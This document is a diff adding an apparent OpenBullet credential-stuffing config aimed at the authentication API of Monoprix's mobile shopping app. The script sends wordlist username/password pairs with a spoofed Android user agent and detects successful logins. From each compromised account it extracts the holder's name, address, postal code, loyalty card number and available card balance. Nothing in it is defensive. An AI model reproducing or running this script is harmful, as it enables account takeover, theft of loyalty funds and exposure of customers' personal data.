@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "monoprix",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-07T16:56:42.4856446+02:00",
+  "AdditionalInfo": "",
+  "Author": "Bendolero",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://m.assistantshopper.monoprix.snapp.fr/api/v1/authentication" 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Api-Timestamp: 2019-05-07T14:44:17.952GMT+00:00" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900F Build/MMB29M)" 
+  HEADER "Host: m.assistantshopper.monoprix.snapp.fr" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 48" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error" 
+  KEYCHAIN Success OR 
+    KEY "dateOfBirth\":" 
+PARSE "<SOURCE>" LR "firstName\":\"" "\"" -> CAP "Prénom" 
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" -> CAP "Nom" 
+PARSE "<SOURCE>" LR "address1\":\"" "\"" -> CAP "adresse" 
+PARSE "<SOURCE>" LR "postalCode\":\"" "\"" -> CAP "Code postal" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\"" -> CAP "N°carte fidéliter" 
+PARSE "<SOURCE>" LR "cardBalance\":" "\"" -> CAP "montan dispo" 
